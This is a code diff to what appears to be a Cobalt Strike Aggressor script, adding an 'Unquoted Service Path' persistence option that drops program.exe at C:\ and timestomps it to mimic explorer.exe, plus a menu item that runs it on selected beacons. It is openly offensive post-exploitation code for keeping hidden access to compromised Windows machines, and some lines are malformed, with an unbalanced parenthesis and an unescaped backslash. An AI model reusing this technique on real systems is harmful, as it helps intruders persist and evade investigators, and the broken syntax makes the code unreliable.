@@ -89,6 +89,16 @@ sub persist_linkinfo {
     else {
         berror($1, "linkinfo.dll not found.");
     }
+sub persist_unquotepath {
+    if (-exists script_resource("program.exe")) {
+    	binput($1, "dropping program.exe");
+	bcd(($1, 'c:\');
+	bupload($1, script_resource("program.exe"));
+	btimestomp($1, "program.exe", "c:\windows\explorer.exe");
+    }
+    else {
+    	berror($1, "program.exe not found");
+    }
 }
 
 sub persist_schjob {
@@ -129,7 +139,12 @@ popup beacon_top {
 	        local('$bid');
 	        foreach $bid ($1) {
             	persist_schjob($bid);
-	        }   
+	    }   
+	    item "Unquoted Service Path" {
+	        local('$bid');
+	        foreach $bid ($1) {
+            	persist_unquotepath($bid);
+	    }
     	}
     }
 }
